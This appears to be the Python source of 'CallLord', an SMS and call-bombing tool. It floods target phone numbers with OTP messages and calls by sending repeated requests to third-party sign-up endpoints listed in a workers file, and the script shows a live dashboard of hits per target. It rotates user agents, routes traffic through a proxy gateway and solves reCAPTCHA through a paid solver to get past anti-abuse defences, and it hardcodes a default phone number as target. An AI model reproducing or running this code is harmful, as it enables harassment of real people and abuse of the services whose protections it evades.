from Initializer import workerObject, targetObject
from rich import print
from rich.pretty import pprint, Pretty
from rich.spinner import Spinner
from rich.console import Console, Group
from rich.layout import Layout
from rich.text import Text
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from random_user_agent.params import SoftwareName, OperatingSystem
from random_user_agent.user_agent import UserAgent
from twocaptcha import TwoCaptcha
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from seleniumwire.undetected_chromedriver.v2 import Chrome, ChromeOptions
from requests import Request, Session
import tqdm
import random
import requests
import cloudscraper
import threading
import json
import time
import datetime
import os

target_list_objs = []
target_threads = []
error_log = []

username = os.getenv("PROXY_USER", "")
password = os.getenv("PROXY_PASS", "")
proxy = f"https://{username}:{password}@gate.smartproxy.com:20000"

target_stats_ui = Table("Target", "Call Hits", "Call Miss", "Call Total", "SMS Hits", "SMS Miss", "SMS Total").grid(expand=True)

def generate_target_stats_ui(targets) -> Table:
    global error_log
    image = """
   ______      ______                   __
  / ____/___ _/ / / /   ____  _________/ /
 / /   / __ `/ / / /   / __ \/ ___/ __  / 
/ /___/ /_/ / / / /___/ /_/ / /  / /_/ /  
\____/\__,_/_/_/_____/\____/_/   \__,_/   
                                  by g.
    """
    image = Text(image, justify="center", style="bold red")
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="main", ratio=2),
    )
    layout["header"].update(image)
    layout["main"].split_column(
        Layout(name="top", size=4),
        Layout(name="mid", size=5),
        Layout(name="bottom", size=5),
    )

    target_table = Table("Number", "SMS Hit", "SMS Fail", "Call Fail", "Hit Fail", "Total", expand=True, box=None)
    worker_table = Table("Worker", "Mode", "HTTP", "Hit", "Miss", "Total", "DPC", "DPB", "Burst", "Req. PB", expand=True, box=None)
    error_table = Table("Log", expand=True, box=None)

    for number in targets:
        target_table.add_row(
            str(number.num), str(number.sms_hit), str(number.sms_miss), str(number.call_hit), str(number.call_miss), str(number.count),
        )
        for worker in number.sms_workers_allocated:
            spinner_display = Spinner("aesthetic", text=worker.workerName, style=None, speed=1.0)
            worker_table.add_row(
                spinner_display if worker.workerStateRunning else f"[bold red]{worker.workerName}[/bold red]",
                str(worker.workerMode), str(worker.workerType), f"[bold green]{str(worker.hit)}[/bold green]",
                f"[bold red]{str(worker.miss)}[/bold red]", f"[bold]{str(worker.total)}[/bold]", str(worker.workerDPC),
                str(worker.workerDPB), str(worker.burst), str(worker.workerMax)
            )
        for worker in number.call_workers_allocated:
            worker_table.add_row(
                f"[bold green]{worker.workerName}[bold green]" if worker.workerStateRunning else f"[bold red]{worker.workerName}[/bold red]",
                str(worker.workerMode), str(worker.workerType), f"[bold green]{str(worker.hit)}[/bold green]",
                f"[bold red]{str(worker.miss)}[/bold red]", f"[bold]{str(worker.total)}[/bold]", str(worker.workerDPC),
                str(worker.workerDPB), str(worker.burst), str(worker.workerMax)
            )

    for item in error_log:
        error_table.add_row(item)

    layout["top"].update(target_table)
    layout["mid"].update(worker_table)
    layout["bottom"].update(error_table)

    return layout

def initialize_targets(targets):
    global target_list_objs
    for target in targets:
        new_target = targetObject(target, 10)
        new_target.sms_workers_allocated, new_target.call_workers_allocated = initialize_workers(new_target)
        target_list_objs.append(new_target)

def twocaptcha_init():
    apikey = os.getenv("CAPTCHA_API_KEY", "")
    solver = TwoCaptcha(apikey)
    return solver

def initialize_workers(target):
    workers_ = json.loads(open("workers.json").read())
    enabled_workers = [worker for worker in workers_ if worker['workerIsActive'] == "True"]
    for worker in enabled_workers:
        new_worker = workerObject(
            worker['workerName'], worker['workerMode'], worker['workerType'],
            worker['workerDPC'], worker['workerDPB'], worker['burst'],
            worker['workerMax'], worker['workerURL'], worker['workerBypassMethod'],
            worker['workerStatus'], worker['workerIsActive'], worker['workerHeader'],
            worker['workerParameters'], worker['workerSuccessText']['status_text'],
            worker['workerPrefix'], worker['google_token'], worker['seleniumBypass']
        )
        new_worker.workerParameters = assignTarget(new_worker, target)
        target.all_workers_allocated.append(new_worker)
    sms_workers = [worker for worker in target.all_workers_allocated if worker.workerMode == "SMS"]
    call_workers = [worker for worker in target.all_workers_allocated if worker.workerMode == "CALL"]
    target.sms_workers_allocated = sms_workers
    target.call_workers_allocated = call_workers
    return target.sms_workers_allocated, target.call_workers_allocated

def assignTarget(worker, _target):
    for key, value in worker.workerParameters.items():
        if '#target' in value:
            worker.workerParameters[key] = worker.workerPrefix + _target.num
    for key, value in worker.workerHeader.items():
        if '#userAgent' in value:
            worker.workerHeader[key] = getUserAgent()
    return worker.workerParameters

def getUserAgent():
    software_names = [SoftwareName.CHROME.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
    user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
    return user_agent_rotator.get_random_user_agent()

def prepare_attack(target, options, live):
    if "sms_flood" in options:
        target = start_sms_flood_attack(target, live)
    elif "sms" in options:
        target = start_attack(target, "sms_flood", live)
    elif "call" in options:
        target = start_attack(target, "call_cycle", live)
    elif "call_flood" in options:
        target = start_attack(target, "call_flood", live)
    else:
        print("[bold red] ERROR [bold red]: Invalid option")
    return target

def start_sms_flood_attack(target, live):
    sms_threads = []
    for _ in range(10):
        t = threading.Thread(target=start_cycle, args=(target,))
        sms_threads.append(t)
    for thread in sms_threads:
        thread.start()

def start_attack(target, mode, live):
    if mode == "sms_flood":
        for worker in target.sms_workers_allocated:
            worker.workerStateRunning = True
            while int(worker.total) < int(worker.workerMax):
                target, worker = start_cycle(target, worker, live)
                worker.workerStateRunning = False
                time.sleep(int(worker.workerDPB))
    elif mode == "call_flood":
        for worker in target.call_workers_allocated:
            worker.workerRunningState = True
            target, worker = start_cycle(target, worker, live)
            time.sleep(int(worker.workerDPB))
            worker.workerRunningState = False
    elif mode == "call_cycle":
        for worker in target.call_workers_allocated:
            while int(worker.total) < int(worker.workerMax) and target.count < target.max:
                worker.workerRunningState = True
                target, worker = start_cycle(target, worker, live)
                print("Target count: ", target.count)
                time.sleep(int(worker.workerDPB))
                worker.workerRunningState = False
        else:
            print("Target max reached")
    return target

def prepare_request(worker):
    try:
        scraper = cloudscraper.create_scraper(
            interpreter="nodejs",
            browser={"browser": "firefox", "platform": "windows", "mobile": True},
            captcha={"provider": "2captcha", "api_key": os.getenv("CAPTCHA_API_KEY", "")},
        )
        if worker.google_token != 0:
            solver = twocaptcha_init()
            solved_captcha_token = solver.recaptcha(sitekey=worker.google_token, url='https://dubizzle.com.eg')
            for k, v in worker.workerParameters.items():
                if '#captchaToken' in v:
                    worker.workerParameters[k] = solved_captcha_token
        if worker.seleniumBypass != 0:
            s, worker = seleniumBypass(worker)
        else:
            s = scraper
        worker.workerHeader = {key: value.encode('utf-8') for key, value in worker.workerHeader.items()}
        if 'Content-Type' in worker.workerHeader and b'application/json' in worker.workerHeader['Content-Type']:
            req = s.get(url=worker.workerURL, params=worker.workerParameters, headers=worker.workerHeader) if worker.workerType == "GET" else s.post(url=worker.workerURL, json=worker.workerParameters, headers=worker.workerHeader)
        else:
            req = s.get(url=worker.workerURL, params=worker.workerParameters, headers=worker.workerHeader) if worker.workerType == "GET" else s.post(url=worker.workerURL, data=worker.workerParameters, headers=worker.workerHeader)
        return req
    except Exception as e:
        error_log.append(f"[bold italic]{[worker.workerName, e]}[/bold italic]")
        return e

def start_cycle(target, worker, live):
    global table
    sent = 0
    while sent < int(worker.burst):
        try:
            resp = prepare_request(worker)
            if resp.text and worker.workerSuccessText in resp.text:
                worker.hit += 1
                if worker.workerMode == "SMS":
                    target.sms_hit += 1
                elif worker.workerMode == "CALL":
                    target.call_hit += 1
                live.update(generate_target_stats_ui(target_list_objs))
                time.sleep(int(worker.workerDPC))
            else:
                worker.miss += 1
                if worker.workerMode == "SMS":
                    target.sms_miss += 1
                elif worker.workerMode == "CALL":
                    target.call_miss += 1
            error_log.append(f"[bold green]{resp.text}[/bold green]")
            live.update(generate_target_stats_ui(target_list_objs))
        except Exception as e:
            worker.miss += 1
            if worker.workerMode == "SMS":
                target.sms_miss += 1
            elif worker.workerMode == "CALL":
                target.call_miss += 1
            error_log.append(f"[bold red]{str(e)}[/bold red]")
            live.update(generate_target_stats_ui(target_list_objs))
        sent += 1
        worker.total += 1
        target.count += 1
    return target, worker

def main():
    global target_list_objs
    targets = os.getenv("TARGETS", "01019444480")
    options = os.getenv("OPTIONS", "call").split(",")
    target_list = targets.split(",")
    initialize_targets(target_list)
    with Live(generate_target_stats_ui(target_list_objs), refresh_per_second=4) as live:
        print("[bold]Press any key to begin.[/bold]")
        input()
        if "multi" in options:
            for target in target_list_objs:
                thread = threading.Thread(target=prepare_attack, args=(target, options, live))
                target_threads.append(thread)
            for thread in target_threads:
                thread.start()
        else:
            for target in target_list_objs:
                prepare_attack(target, options, live)

if __name__ == "__main__":
    main()
